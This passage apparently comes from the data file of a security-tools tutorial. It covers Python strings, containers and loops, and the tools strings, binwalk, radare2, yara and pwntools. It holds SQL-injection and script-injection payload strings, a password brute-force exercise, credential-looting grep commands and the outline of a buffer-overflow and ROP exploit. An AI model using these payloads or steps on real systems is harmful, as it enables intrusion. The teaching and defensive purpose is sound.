            "deep": "Strings are immutable — methods return NEW strings. f-strings compile to fast concatenation and embed expressions (f'{port+1}'). base64 maps 3 bytes to 4 ASCII chars (hence the = padding); it is encoding, NOT encryption — anyone can decode it, which is exactly why you check cookies/tokens for it. URL percent-encoding escapes reserved characters so a payload isn't parsed as URL syntax; double-encoding is a classic filter bypass.",
        },
        "typical": "f'http://{host}:{port}/?q={payload}'   # build a request URL with an injected param",
        "syntax": {
            "s[1:4]   s[::-1]":    "Slice (substring) / reverse. Strings are immutable — slices return new strings.",
            ".split(x) / x.join(L)":"Break a string into a list / join a list into a string. Parse and build.",
            ".strip()  .replace(a,b)":"Trim whitespace / swap substrings — clean up captured data.",
            "f'...{var}...'":      "f-string: interpolate variables and expressions directly into text.",
            "base64.b64encode/decode":"Raw bytes <-> base64 text (cookies, tokens, JSON-safe data).",
            ".hex() / bytes.fromhex()":"bytes <-> hex text (addresses, shellcode, hashes).",
            "urllib.parse.quote/unquote":"URL-encode/decode a payload so it survives an HTTP request.",
        },
        "code": """import base64, urllib.parse

# 1) decode a token you captured (base64 is ENCODING, not encryption)
token = 'YWRtaW46cGFzc3dvcmQ='
print(base64.b64decode(token))         # b'admin:password'   <- creds in the clear

# 2) build a request URL with an injected parameter
host, port = '10.0.0.5', 8080
payload = "1' OR '1'='1"
url = f"http://{host}:{port}/login?user={urllib.parse.quote(payload)}"
print(url)   # http://10.0.0.5:8080/login?user=1%27%20OR%20%271%27%3D%271

# 3) hex round-trip (how you handle shellcode / hashes)
print(b'AAAA'.hex())                   # 41414141
print(bytes.fromhex('41414141'))       # b'AAAA'
""",
        "notes": [
            "base64 is ENCODING, not encryption — if a cookie/token looks like base64 (alphanumeric, ends in =), decode it first; secrets hide there constantly.",
            "Strings are immutable: .replace()/.upper()/slicing return NEW strings, they don't change the original. Reassign to keep the result.",
            "f-strings can run expressions: f'{port+1}', f'{data.hex()}'. Use them to build requests cleanly instead of clumsy concatenation.",
            "URL-encode payloads with urllib.parse.quote so special chars (space, ', =, &) survive the request instead of being parsed as URL syntax — and double-encoding is a common filter bypass.",
            "Encoding works on bytes: base64/hex want bytes in, so .encode() your str first, e.g. base64.b64encode('x'.encode()).",
        ],
        "exercise": "In the REPL: base64-decode 'cm9vdDp0b29y' (what creds drop out?). Then URL-encode the payload <script>alert(1)</script> with urllib.parse.quote and build an f-string URL like http://target/search?q=<encoded>. Bonus: hex-encode the bytes of 'flag{' and convert back.",
        "next": [
            "python-collections (parse results into lists/dicts; wordlists)",
            "python-requests (send the URLs you just built)",
            "python-basics (str vs bytes, if encoding errors bite)",
            "xsstrike / sqlmap (the payloads you're encoding by hand)",
        ],
        "caution": "The injection payloads here are illustrative strings — only SEND them at targets you own or are explicitly authorized to test (covered in python-requests). Crafting and decoding locally is harmless; firing them is not.",
        "try_cmd": "python3",
    },
    "python-collections": {
        "summary": "The containers that hold your data — lists (ordered), dicts (key->value), sets (unique), tuples (fixed). In practice: wordlists, scan results keyed by host, deduping targets, and parsing 'ip:port' lines into structure",
        "mental_model": (
            "Real tools work on COLLECTIONS, not single values: a list of ports to scan, a wordlist of "
            "passwords, a dict mapping each host to its open ports, a set of unique IPs you've seen. Picking the "
            "right container is half the design: list when order/duplicates matter (a wordlist), set when you "
            "want uniqueness and fast membership (dedup discovered hosts), dict when you look things up by a key "
            "(host -> services), tuple when it's a fixed record. Moving data between them is most of what a "
            "recon script does."
        ),
        "analogy": (
            "The containers are kinds of evidence storage. A list is a numbered photo log (order matters, "
            "duplicates allowed). A set is a fingerprint database (each entry unique, instant 'seen it?'). A "
            "dict is a labelled evidence locker (look it up by case number, don't dig). A tuple is a sealed bag "
            "you don't reopen. Choosing the right one keeps the case manageable."
        ),
        "zoom": {
            "eli5": "Collections hold many values at once. A list is an ordered line of items, a set keeps only unique ones, a dict looks things up by a label, a tuple is a fixed little group. Hackers use them for wordlists, results, and deduping targets.",
            "operator": "list = wordlists/ordered results (append, slice, comprehensions). set = dedup + fast membership (if ip in seen). dict = lookups (results[host] = ports). tuple = fixed records (ip, port). sorted(set(L)) dedups and orders in one line.",
            "deep": "Lists are dynamic arrays (fast append/index, slow O(n) membership). Sets and dicts are hash tables (O(1) membership/lookup — 'ip in big_set' is instant, 'ip in big_list' is slow). Dict keys and set members must be hashable (immutable) — that's why a tuple can be a key but a list can't. Comprehensions read as intent; dict.get(k, default) avoids KeyError on missing keys when parsing messy output.",
        },
        "typical": "results = {}        # host -> list of open ports: the shape of a scan result",
        "syntax": {
            "[1, 2, 3]   list":    "Ordered, allows duplicates. .append(x), index [0], slice [1:3].",
            "{1, 2, 3}   set":     "Unique items, fast 'x in s'. set(my_list) dedups instantly.",
            "{'k': 'v'}   dict":   "Key -> value lookup. d['k'], d.get('k', default), d.items().",
            "(ip, port)   tuple":  "Fixed, immutable record — can be a dict key or set member.",
            "[x for x in xs if c]":"Comprehension — filter/transform a collection in one readable line.",
            "len(x)   sorted(x)":  "Count items / return a new sorted list.",
        },
        "code": """# a scan result as a dict: host -> list of open ports
results = {}
results['10.0.0.5'] = [22, 80, 443]
results['10.0.0.6'] = [3389]
for host, ports in results.items():
    print(f"{host} has {len(ports)} open: {ports}")

# dedup + sort a noisy port list in ONE line
ports = [80, 443, 22, 80, 8080, 443]
print(sorted(set(ports)))              # [22, 80, 443, 8080]

# parse an 'ip:port' line into usable pieces
ip, port = '10.0.0.5:8080'.split(':')
print(ip, int(port))                   # 10.0.0.5 8080   (int(): split gives str)

# count UNIQUE hosts seen
seen = {'10.0.0.1', '10.0.0.1', '10.0.0.2'}
print(len(seen))                       # 2
""",
        "notes": [
            "set membership is instant, list membership is slow: keep a SET of 'already seen' hosts/IPs in a big scan, not a list.",
            "split() returns strings — wrap a port in int() before comparing or sorting numerically, or '9' sorts after '100'.",
            "dict.get(key, default) won't crash on a missing key; results[key] raises KeyError. Use .get when parsing data you don't fully trust.",
            "Comprehensions read as intent: [p for p in ports if p < 1024] = 'the privileged ports'. Prefer them over a manual loop+append.",
            "Only immutable things (str, int, tuple) can be dict keys or set members — that's why (ip, port) works as a key but [ip, port] doesn't.",
        ],
        "exercise": "Build a dict mapping 3 hostnames to lists of open ports. Loop it and print only hosts with more than one open port. Then take a list with duplicate IPs and print how many UNIQUE ones there are. Bonus: from ['10.0.0.5:22','10.0.0.6:80'] build {ip: int(port)} with a comprehension.",
        "next": [
            "python-controlflow (loop and branch over these collections)",
            "python-files (load a wordlist into a list, write results out)",
            "python-functions (package your parsing into reusable tools)",
            "python-strings (the .split that feeds your parsing)",
        ],
        "try_cmd": "python3",
    },
    "python-controlflow": {
        "summary": "Making Python DO things at scale — if/elif/else to decide, for/while to repeat, range to count, comprehensions to filter. This is the loop at the heart of every scanner: 'for each target, try this, branch on the result'",
        "mental_model": (
            "Every offensive script is the same skeleton: iterate over a collection (ports, hosts, passwords), "
            "DO something to each, and BRANCH on the outcome (open/closed, success/fail, found/not-found). "
            "That's control flow: 'for' walks a collection, 'while' repeats until a condition, 'if/elif/else' "
            "chooses a path, comprehensions express 'the items matching a condition' in one line. Once you can "
            "loop over a wordlist and branch on each result, you can write a brute-forcer, a scanner, or a "
            "fuzzer — they are all that one pattern."
        ),
        "analogy": (
            "Control flow is the lockpicking rake versus the single pick. A 'for' loop is raking every pin in "
            "turn; the 'if' is feeling which pin set; 'break' is stopping the instant the lock opens. A scanner "
            "is just you, methodically trying each door (loop), checking if it gave (if), and noting the ones "
            "that did — at machine speed."
        ),
        "zoom": {
            "eli5": "Control flow is how a program decides and repeats. 'if' picks what to do, 'for' repeats for each item in a list, 'while' repeats until something changes. A scanner is just a loop over targets with an 'if' on each result.",
            "operator": "for item in collection: to walk ports/hosts/words. if/elif/else to branch on each result. range(1,255) to count an octet/port range. break to stop on first success, continue to skip a bad item. Comprehensions to filter in one line. enumerate(xs, 1) when you want a counter.",
            "deep": "for iterates any iterable (lists, files line-by-line, generators) lazily where it can — looping a huge file doesn't load it all into RAM. while + a condition handles 'until' loops (retry until connected). break/continue/else give precise control (for...else runs else only if no break fired — clean 'not found' logic). Comprehensions are faster than the equivalent append loop; generator expressions stream instead of building a list, which matters for big wordlists.",
        },
        "typical": "for port in [22, 80, 443]:   # the loop at the heart of every scanner",
        "syntax": {
            "if c: / elif c: / else:":"Branch on a condition — the decision.",
            "for x in collection:": "Repeat once per item (ports, hosts, words, file lines).",
            "while condition:":     "Repeat until the condition goes false (retry loops).",
            "range(1, 255)":        "Count 1..254 — iterate an IP octet or a port range.",
            "break / continue":     "Stop the loop entirely / skip to the next item.",
            "[x for x in xs if c]": "Comprehension — the filtered/transformed items in one line.",
            "enumerate(xs, 1)":     "Loop with a counter: for i, x in enumerate(xs, 1).",
        },
        "code": """# the scanner skeleton: loop targets, branch on each result
ports = [22, 80, 443, 3389, 8080]
for i, port in enumerate(ports, 1):
    if port < 1024:
        print(f"[{i}] port {port:<5} -> privileged service")
    else:
        print(f"[{i}] port {port:<5} -> high port")

# comprehension: just the privileged ports, one line
priv = [p for p in ports if p < 1024]
print(priv)                            # [22, 80, 443]

# walk an IP range with range()
for octet in range(1, 4):
    print(f"would scan 10.0.0.{octet}")   # .1  .2  .3

# while: retry until 'connected' (simulated)
tries = 0
while tries < 3:
    tries += 1
    print(f"attempt {tries}")          # attempt 1, 2, 3
""",
        "notes": [
            "for over a file object reads it line-by-line WITHOUT loading the whole file — that's how you loop a 14-million-line wordlist on a Pi without running out of RAM (next: python-files).",
            "break stops on first success (found the password, stop brute-forcing); continue skips a bad item (dead host) and moves on. Use them to stay efficient.",
            "for...else: the else runs only if the loop finished WITHOUT a break — a clean way to say 'tried everything, nothing matched'.",
            "Prefer comprehensions over manual append loops: [p for p in ports if p < 1024] is faster and clearer. Use a generator (round brackets) for huge inputs to stream instead of storing.",
            "Indentation defines the block — lines under for/if must be consistently indented (4 spaces). Mixed tabs/spaces is the classic IndentationError.",
        ],
        "exercise": "Write a loop over a list of ports that prints 'common' for 22/80/443 and 'uncommon' otherwise (use 'in' + if/else). Then use a comprehension to build a list of only the ports above 1000. Bonus: loop a small password list and 'break' with a printed 'cracked!' when you hit 'toor'.",
        "next": [
            "python-functions (wrap your loop into a reusable scan() function)",
            "python-files (loop a real wordlist from disk)",
            "python-sockets (turn this skeleton into a real port scanner)",
            "python-errors (so a dead host doesn't crash the loop)",
        ],
        "try_cmd": "python3",
    },
    "strings": {
        "summary": "The 60-second first look at any binary or unknown file — pulls out the human-readable text (URLs, error messages, paths, embedded commands, keys) hiding in compiled or binary data. The first command you run, before any heavy tool",
        "typical": "strings -n 8 <file>            (printable runs >=8 chars)   |   strings <file> | grep -iE 'http|pass|key|/'",
        "mental_model": (
            "A compiled program or binary blob is mostly machine code and data — unreadable. But sprinkled "
            "through it are runs of actual text the program needs at runtime: URLs it contacts, error and debug "
            "messages, file paths, registry keys, sometimes hardcoded passwords or API keys. strings just walks "
            "the file byte by byte and prints every run of printable characters long enough to look "
            "intentional. It's dumb and instant — and it's astonishing how often the answer is right there in "
            "the plain text."
        ),
        "analogy": (
            "strings is shaking out the pockets of a jacket before you send it to the lab. You're not analysing "
            "the fabric yet — you're dumping out the receipts, notes, and keys that fell in, because half the "
            "time one of them tells you everything you needed to know."
        ),
        "flags": {
            "<file>":      "The file to scan — any binary, executable, firmware image, memory dump, document, or unknown blob.",
            "-n <len>":    "Minimum run length to print (default 4). Bump to -n 8 to cut noise and surface meaningful text.",
            "-a, --all":   "Scan the WHOLE file, not just the loaded data section — important for packed files and raw blobs (often the default).",
            "-t <radix>":  "Print each string's offset (o/d/x = octal/decimal/hex) so you can jump straight to it in a hex editor or RE tool.",
            "-e <enc>":    "Character encoding/width (s=7-bit, l=16-bit little-endian, b=big-endian). Catches UTF-16 text the default 8-bit scan misses (common in Windows binaries).",
        },
        "read": [
            "Pipe to grep, always: `strings bin | grep -iE 'http|ftp|pass|key|token|BEGIN'` turns a wall of text into leads in one line.",
            "Use -e l on Windows binaries — tons of text is UTF-16 (wide) and invisible to the default 8-bit scan.",
            "-t x gives the offset; feed that into Ghidra/radare2/a hex editor to see the code that USES the string.",
            "No interesting text at all? That's a signal too — the file is probably packed or encrypted (try binwalk entropy next).",
            "It's read-only and instant: zero risk to run on a sample, so it's always the first triage step before the heavy tools.",
        ],
        "zoom": {
            "eli5": "Programs hide little bits of normal text inside them — web links, messages, sometimes passwords. strings finds and prints all that text so you can read it without understanding the rest of the file.",
            "operator": "Run strings (with -n 8, and -e l for Windows binaries), pipe to grep for the patterns you care about, and use -t x offsets to pivot into Ghidra/radare2 at the exact spot. First step of any triage.",
            "deep": "strings scans for maximal runs of printable characters meeting the length threshold, across the encodings you select. In malware triage it surfaces C2 domains, mutex names, dropped-file paths, and command lines; in CTFs it often holds the flag outright. Low or uniform output suggests packing/encryption — pivot to entropy analysis. The offsets (-t) bridge to static RE: the string's cross-references reveal the logic that touches it.",
        },
        "apply": [
            "First look: `strings -n 8 suspicious.bin | less` — skim for domains, paths, messages.",
            "Hunt secrets/IOCs: `strings suspicious.bin | grep -iE 'http|https|pass|key|token|powershell'`.",
            "Windows wide text: `strings -e l malware.exe | grep -i http` to catch UTF-16 URLs.",
            "Locate then pivot: `strings -t x bin | grep 'Access denied'` gives the offset; open it in Ghidra and check cross-references.",
            "Packed check: if strings is mostly garbage, run binwalk -E for an entropy read before going further.",
        ],
        "next": [
            "ghidra (use the offsets to find the code that references an interesting string)",
            "binwalk (when strings is sparse — check for packing/embedded files)",
            "radare2 (iz lists strings inside the binary with full context)",
            "yara (turn distinctive strings you find into a detection rule)",
        ],
        "caution": "strings itself is harmless (read-only), but the FILES you run it on may be live malware — handle samples in an isolated VM. Anything it prints (keys, tokens) may be sensitive; treat findings accordingly.",
        "cia": [
            "DEFENSIVE / BLUE — the universal first triage in malware analysis and IR: C2 domains, IOCs, and dropped paths often appear in plaintext.",
            "CONFIDENTIALITY — surfaces secrets developers left in binaries (API keys, passwords, internal URLs) — a real finding in app assessments.",
            "OFFENSE — fast recon on a target binary or firmware before committing to full reverse engineering.",
        ],
        "try_cmd": "strings -n 8 /bin/ls | head",
    },
    "binwalk": {
        "summary": "The firmware and embedded-file analysis tool — scans any blob for the signatures of files hidden INSIDE it (filesystems, kernels, archives, images, certificates) and extracts them. The go-to for router/IoT firmware, flash dumps, and any 'what's packed in here?' question",
        "typical": "binwalk <firmware.bin>        (signature scan)   |   binwalk -Me <firmware.bin>   (extract, recursively)",
        "mental_model": (
            "A firmware image or a carved blob is usually many files concatenated together: a bootloader, a "
            "kernel, one or more filesystems, config, certificates — with no directory listing. binwalk reads "
            "the blob looking for magic bytes that mark the start of known file types, builds a map of what's "
            "inside and where, then carves each piece out and recurses into it. The whole skill is: find the "
            "filesystem, extract it, and now you're reading the device's actual code and config on disk."
        ),
        "analogy": (
            "binwalk is an airport scanner for a sealed shipping container with no manifest. It X-rays the whole "
            "thing, recognises the shape of each item packed inside (here's a filesystem, there's a kernel, "
            "that's a certificate), and lets you cut them out one by one to inspect."
        ),
        "flags": {
            "<file>":          "The blob to analyse — firmware image, flash/partition dump, unknown binary.",
            "-B, --signature": "The default: scan for known file signatures (magic bytes) and map what's embedded and at what offset.",
            "-e, --extract":   "Automatically carve out and extract the known file types it recognises.",
            "-M, --matryoshka":"Recurse — re-scan and extract files found inside the files it just extracted (nested firmware). Pair as -Me.",
            "-E, --entropy":   "Plot byte entropy across the file — high flat entropy = compressed/encrypted regions (where the interesting stuff usually hides).",
            "-A, --opcodes":   "Scan for executable opcode signatures — identify the CPU architecture of embedded code.",
            "-y <str>":        "Only show results matching <str> — filter the scan, e.g. -y filesystem.",
        },
        "read": [
            "-Me is the workhorse: extract everything, recursively. The prize is almost always an extracted filesystem (squashfs, jffs2, cramfs) — that's the device's real OS.",
            "After extraction, cd into the _<file>.extracted/ tree and treat it like a normal Linux box: grep for passwords, keys, shadow files, hardcoded creds, startup scripts.",
            "Use -E (entropy) when a scan finds nothing: a smooth high-entropy plateau means that region is compressed or encrypted, not empty.",
            "Extraction relies on helper tools (unsquashfs, jefferson, sasquatch) being installed — a missing extractor shows as recognised-but-not-extracted.",
            "binwalk ties directly to your hardware work: a chip/flash dump or a downloaded firmware update file is exactly its input.",
        ],
        "zoom": {
            "eli5": "Firmware is a bunch of files glued into one big lump with no labels. binwalk recognises the pieces by their fingerprints, pulls them apart, and hands you the device's real files — where the passwords and code live.",
            "operator": "Scan to map the blob, -Me to extract recursively, then cd into the extracted filesystem and loot it like a normal box (grep for creds/keys/configs). Use -E entropy to spot compressed/encrypted regions when a plain scan comes up empty.",
            "deep": "binwalk matches libmagic-style signatures against every offset, so it finds files even when concatenated without headers or padding. Recursive extraction handles nested containers (firmware-in-firmware). Entropy analysis separates code/data from compressed/encrypted blobs. It's the front door of hardware/IoT assessment: dump flash (or grab the vendor update), carve the root filesystem, then static-analyse the binaries inside with Ghidra/radare2 and the configs by hand.",
        },
        "apply": [
            "Map it: `binwalk firmware.bin` — read the offset table of what's inside.",
            "Extract everything recursively: `binwalk -Me firmware.bin`, then `cd _firmware.bin.extracted`.",
            "Loot the extracted filesystem: `grep -riE 'password|api_key|PRIVATE KEY' squashfs-root/`.",
            "Stuck / nothing found: `binwalk -E firmware.bin` to check if it's compressed/encrypted.",
            "Identify embedded code architecture: `binwalk -A firmware.bin` before loading pieces into Ghidra.",
        ],
        "next": [
            "ghidra (reverse the binaries you carved out of the firmware)",
            "strings (quick triage of the extracted files and the blob itself)",
            "radare2 (analyse extracted executables)",
            "the-shell (loot the extracted filesystem with grep/find)",
        ],
        "caution": "Analysing firmware you don't own can violate copyright/EULA; extract and study firmware for devices you own or are authorized to assess. Extracted filesystems can contain real secrets — treat as sensitive. Carving runs helper extractors on attacker-controlled data, so work in an isolated VM.",
        "cia": [
            "CONFIDENTIALITY — extracted firmware filesystems routinely contain hardcoded credentials, keys, and certificates — the classic IoT finding.",
            "DEFENSIVE / BLUE — vendors and assessors binwalk their OWN firmware to find leaked secrets and backdoors before shipping; malware analysts carve embedded payloads.",
            "INTEGRITY — comparing extracted contents against expected images reveals tampered or trojaned firmware.",
        ],
        "try_cmd": "binwalk /bin/ls",
    },
    "radare2": {
        "summary": "The command-line reverse-engineering framework — a scriptable do-everything binary analysis suite (disassembler, debugger, hex editor, patcher) driven by a terse command language. The CLI counterpart to Ghidra, loved for speed, scripting, and on-target work",
        "typical": "r2 -A <binary>     (open + auto-analyse)   then:  afl (list funcs)  ->  s main  ->  pdf (disasm)  ->  VV (graph)",
        "mental_model": (
            "radare2 treats a binary as a navigable space you move a cursor (the 'seek' position) through, "
            "issuing short commands to analyse, view, edit, or run the code wherever you are. The commands look "
            "cryptic but they're a consistent language: a letter for the action, more letters to refine it "
            "(a=analyse, p=print, d=debug, w=write). Once 'aaa' has analysed the file you navigate by function "
            "and cross-reference instead of by raw address — the same mental model as Ghidra, but in a fast, "
            "scriptable shell you can run over SSH on the target itself."
        ),
        "analogy": (
            "If Ghidra is a furnished RE studio with big windows, radare2 is a master mechanic's CLI toolroll: "
            "nothing pretty, but every tool is there, it fits in your pocket, it works on the roadside (over "
            "SSH, on tiny boxes), and once you know the grips you're faster than someone clicking menus."
        ),
        "flags": {
            "r2 <binary>":  "Open the binary in the r2 shell (read-only by default).",
            "-A":           "Run full auto-analysis on open (same as 'aaa' inside) — recover functions, strings, xrefs up front.",
            "-d <prog>":    "Open in DEBUG mode — run the program under r2 to inspect it dynamically (breakpoints, registers, memory).",
            "-w":           "Open in WRITE mode so you can patch bytes/instructions and save the modified binary.",
            "aaa":          "(in-shell) Analyse all — run it first; builds the function list, strings, and cross-references.",
            "afl / s / pdf":"(in-shell) afl = list functions; s <name> = seek to one (e.g. s main); pdf = print disassembly of the current function.",
            "VV / iz / axt":"(in-shell) VV = visual graph view of a function; iz = list strings; axt <addr> = who references this address.",
        },
        "read": [
            "Always 'aaa' (or open with -A) first — without analysis you're staring at raw bytes; after it you navigate by function and xref.",
            "The command grammar is logical, not random: a=analyse, p=print, s=seek, d=debug, w=write, i=info, x=xref. Learn the prefixes and the rest composes.",
            "VV (visual graph mode) is the closest thing to Ghidra's view — arrow-key through the control-flow graph of a function.",
            "iz (strings in the data section) plus axt (xrefs to an address) is the fast 'find the interesting string, jump to the code using it' loop.",
            "It scripts: r2 -q -c '<commands>' runs headless, and r2pipe drives it from Python — batch-analyse or automate exactly like Ghidra headless.",
        ],
        "zoom": {
            "eli5": "radare2 is a toolbox for taking programs apart, all driven by typing short commands instead of clicking. It does what Ghidra does — see the code, debug it, even edit it — but in a fast terminal that runs anywhere.",
            "operator": "Open with -A, list functions (afl), seek to the one you care about (s sym.main), read it (pdf) or graph it (VV), chase strings (iz) and cross-references (axt). Debug live with -d; patch with -w. Script it via r2 -c or r2pipe.",
            "deep": "radare2 is a suite (r2 the shell, plus rabin2, radiff2, rax2, ragg2) over a unified core that abstracts files, debuggers, and remote targets the same way. The decompiler comes via plugins (r2ghidra brings Ghidra's decompiler into r2). It shines for scripting (r2pipe), binary diffing (radiff2 for patch analysis), live debugging, and running on the target over SSH where a GUI can't. Same RE concepts as Ghidra, different ergonomics.",
        },
        "apply": [
            "Triage a binary: `r2 -A ./bin`, then `afl` to list functions and `s main; pdf` to read main.",
            "Find and follow a string: inside r2, `iz~flag` (grep strings for 'flag'), then `axt <addr>` to see what references it.",
            "Graph a function visually: seek to it and press `VV` (arrow keys to navigate, q to exit).",
            "Debug dynamically: `r2 -d ./bin`, breakpoint with `db <addr>`, `dc` to continue, `dr` to read registers.",
            "Script it headless: `r2 -q -c 'aaa; afl' ./bin`, or drive r2pipe from Python for batch jobs.",
        ],
        "next": [
            "ghidra (the GUI decompiler counterpart — many use both)",
            "gef (gdb-based dynamic analysis when you prefer gdb's debugger)",
            "cutter (radare2's official GUI, if you want the graphs without the keystrokes)",
            "pwntools (build the exploit once RE reveals the bug)",
        ],
        "caution": "RE may be limited by software licenses/EULA and local law — analyse your own binaries, CTF/authorized targets, or malware in an isolated VM. Write mode (-w) modifies binaries; always work on copies.",
        "cia": [
            "DEFENSIVE / BLUE — malware analysis, patch-diffing (radiff2 to find what a security update changed), and vulnerability research.",
            "CONFIDENTIALITY — recovers the logic and secrets inside a binary the author meant to keep opaque.",
            "INTEGRITY — write/patch mode and binary diffing relate to modifying code and detecting modification.",
        ],
        "try_cmd": "r2 -A -q -c afl /bin/ls",
    },
    "yara": {
        "summary": "The pattern-matching engine for malware identification — write rules describing the byte patterns, strings, and conditions that fingerprint a malware family, then scan files, processes, or memory for matches. The lingua franca of threat detection and hunting",
        "typical": "yara rules.yar <file_or_dir>     |   yara -r rules.yar /path     (recurse)   |   yara -s rules.yar sample   (show matches)",
        "mental_model": (
            "Antivirus asks 'is this exact file known-bad?'. YARA asks the smarter question: 'does this file "
            "CONTAIN the patterns that characterise a malware family?'. A YARA rule is a little spec — some "
            "strings (text, hex byte sequences, or regex) plus a boolean CONDITION over them ('any 3 of these "
            "strings AND the file starts with MZ'). You write the rule once from what you learned reversing a "
            "sample, and now you can hunt every file, process, and memory image for anything that shares that "
            "DNA — including variants AV has never seen."
        ),
        "analogy": (
            "AV is a most-wanted poster: it matches one exact face. YARA is a detective's behavioural profile — "
            "'tall, left-handed, always uses this phrase, carries this tool'. It catches not just the one "
            "suspect but the whole crew that shares those traits, even faces never photographed before."
        ),
        "flags": {
            "<rules> <target>":"Run rules against a file or directory; prints which rules matched which files.",
            "-r, --recursive": "Scan a directory tree recursively — sweep a whole filesystem for matches.",
            "-s, --print-strings":"Show WHICH strings matched and where — essential for understanding and tuning a rule.",
            "-m, --print-meta":"Print the rule's metadata (author, description, reference) on a match.",
            "-C, --compiled-rules":"Load pre-compiled rules (yarac output) — much faster for big rule sets and repeated scans.",
            "-c, --count":     "Print only the number of matches — good for quick triage across many files.",
            "-d <var>=<val>":  "Define an external variable a rule can test (e.g. filename, filetype) at scan time.",
        },
        "read": [
            "A rule = meta (info) + strings (the patterns: text, { hex bytes }, or /regex/) + condition (the boolean logic that decides a match). The condition is where the skill lives.",
            "Hex with wildcards is the power feature: { 6A 40 68 ?? ?? ?? ?? } matches a code pattern even as addresses/values change between variants — that's how you catch a family, not one file.",
            "Anchor conditions to cut false positives: 'uint16(0) == 0x5A4D' (MZ header) AND your strings is far stronger than strings alone.",
            "-s while developing, -C in production: see what matched while writing, then compile (yarac) for speed when scanning at scale.",
            "YARA scans memory and processes too, not just files — pair it with volatility (scan a memory image) or run it on live processes to catch in-memory-only malware.",
        ],
        "zoom": {
            "eli5": "YARA lets you write a description of what a piece of malware looks like — certain words, certain byte patterns — and then search lots of files for anything matching, even new versions the antivirus hasn't seen.",
            "operator": "Reverse a sample, pull distinctive strings/byte patterns, write a rule (strings + a tight condition), test with -s, compile with yarac, then hunt files/dirs (-r) and memory images (with volatility). Share rules to spread detection.",
            "deep": "A YARA rule's condition language supports counts, offsets, and file-structure tests via modules (pe, elf, math, hash), plus external variables. Modules let conditions reason about real structure (pe.imphash(), pe sections) instead of raw bytes. Rules are portable across the ecosystem (ClamAV, many EDRs, IR tools, volatility's yarascan) — write once, detect everywhere. The craft is balancing breadth (catch variants) against false positives (a too-loose condition flags benign files).",
        },
        "apply": [
            "Scan a sample with full detail: `yara -s -m myrules.yar sample.bin` (shows which strings hit + rule metadata).",
            "Sweep a directory: `yara -r apt_rules.yar /home` to hunt across a filesystem.",
            "Write a minimal rule: meta + a couple of distinctive strings + condition `uint16(0) == 0x5A4D and 2 of them` (a PE file AND 2+ strings).",
            "Compile for speed at scale: `yarac myrules.yar myrules.yarc` then scan with `yara -C myrules.yarc <target>`.",
            "Hunt in memory: feed a Volatility memory image (the yarascan plugins) or scan live processes for in-memory-only threats.",
        ],
        "next": [
            "ghidra / strings (where the patterns FOR your rules come from — reverse the sample first)",
            "volatility (scan a memory image with your YARA rules)",
            "incident-response (YARA is the detection/hunting workhorse of IR)",
            "sigma (the log-based detection counterpart to YARA's file/memory detection)",
        ],
        "caution": "YARA is defensive/analytical and safe to run, but you point it at potentially malicious samples — keep those in an isolated VM. Over-broad rules cause false positives that erode trust; test against a clean corpus before deploying.",
        "cia": [
            "DEFENSIVE / BLUE — the core of malware identification, threat hunting, and IR; the standard way detection knowledge is written and shared.",
            "INTEGRITY — detecting known-bad patterns in files/memory is how you find tampering and implants that evade exact-hash AV.",
            "CONFIDENTIALITY — by catching malware (credential stealers, exfil tools) early, YARA-based detection protects the data those threats are after.",
        ],
        "try_cmd": "yara --help",
    },
    "pwntools": {
        "summary": "The CTF and exploit-development framework for Python — turns the fiddly parts of binary exploitation (talking to a process/socket, packing addresses, finding offsets, building ROP chains, generating shellcode) into a few clean lines. The de facto standard for writing exploits",
        "typical": "from pwn import *;  io = remote('host', 1337);  io.sendline(payload);  io.interactive()",
        "mental_model": (
            "Writing a binary exploit by hand means endless error-prone plumbing: open a socket or spawn the "
            "process, pack integers into little-endian bytes exactly right, find the precise overflow offset, "
            "hand-assemble shellcode, wire a ROP chain from gadget addresses. pwntools collapses each of those "
            "into a tested one-liner, so your script reads like the ATTACK (find offset -> build payload -> send "
            "-> get shell) instead of byte-wrangling. It's the difference between fighting the tooling and "
            "actually doing the exploit."
        ),
        "analogy": (
            "If exploiting is picking a lock, pwntools is the pre-stocked pick kit and jig: you still have to "
            "understand the lock, but you're not also forging your own picks from wire each time. It hands you "
            "clean, correct tools so all your attention goes to the actual technique."
        ),
        "flags": {
            "from pwn import *":"Imports the whole toolkit into your exploit script — the conventional first line.",
            "remote / process":"remote('ip', port) talks to a live service; process('./bin') runs it locally. Same API, so you develop locally then flip to remote.",
            "p32/p64, u32/u64":"Pack/unpack integers to/from little-endian bytes — turn an address into the exact bytes the target expects (and back).",
            "cyclic / cyclic_find":"Generate a De Bruijn pattern to send, then find the exact overflow offset from the value that landed in the crash — no manual counting.",
            "ELF / context":"ELF('./bin') reads symbols, the GOT/PLT, and gadgets from the binary; context.arch/os sets the target so packing and shellcode come out correct.",
            "ROP / shellcraft":"ROP(elf) auto-builds return-oriented chains from the binary's gadgets; shellcraft generates shellcode (e.g. an exec of a shell) for the target architecture.",
            "gdb.attach":"Drop into gdb on the running target mid-exploit to debug your payload interactively.",
        },
        "read": [
            "Develop on process('./bin') locally, then change ONE line to remote(host, port) to fire at the real target — the identical API is the whole point.",
            "cyclic() + cyclic_find() is the fastest way to find an offset: send the pattern, read the value in the crashed instruction pointer, look it up. Stop counting bytes by hand.",
            "Set context.binary = ELF('./bin') early — it auto-sets arch/bits/endianness so p64, shellcraft, and ROP all behave correctly for the target.",
            "ROP(elf) plus rop.call(...) builds chains from the binary's own gadgets; print(rop.dump()) to see exactly what you're sending.",
            "io.interactive() hands you the shell once the exploit lands — the satisfying last line of nearly every script.",
        ],
        "steps": [
            {
                "cmd": "io = process('./vuln')   # or remote('host', 1337)",
                "do": "Connect to the target binary locally (or over the network) so the script can send input and read output.",
                "why_now": "Set up the channel first; develop locally on process(), then swap to remote() to hit the real service.",
                "watch_for": "A clean connection and the program's initial prompt/output echoed back.",
                "means": "A scripted I/O channel to the vulnerable program.",
                "blue": "This is just a client connection. The vuln it targets is a memory-safety bug — the defenses live in the binary (see step 3's mirror), not the connection.",
            },
            {
                "cmd": "io.sendline(cyclic(200));  off = cyclic_find(<crash value>)",
                "do": "Send a De Bruijn pattern to overflow the buffer, then compute the exact offset to the saved return address from the crash.",
                "why_now": "You must know precisely where control of the instruction pointer happens before you can hijack it.",
                "watch_for": "The value sitting in the instruction pointer at the crash — feed it to cyclic_find for the offset.",
                "means": "The exact padding length to reach and overwrite the return address.",
                "blue": "The crash itself is the signal: stack canaries detect the overwrite and abort; ASLR and NX make the next steps far harder.",
            },
            {
                "cmd": "payload = flat({off: rop.chain()});  io.sendline(payload);  io.interactive()",
